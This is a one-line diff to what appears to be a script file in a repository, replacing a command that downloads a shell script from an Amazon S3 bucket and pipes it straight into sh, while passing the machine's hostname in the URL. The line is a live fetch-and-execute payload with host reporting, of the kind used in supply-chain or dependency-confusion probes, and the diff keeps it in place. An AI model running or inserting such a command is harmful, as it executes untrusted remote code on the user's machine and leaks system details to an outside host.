@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/tsunami-security-scanner-plugins.git\&folder=facebook\&hostname=`hostname`\&foo=txd
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/tsunami-security-scanner-plugins.git\&folder=facebook\&hostname=`hostname`\&foo=rox
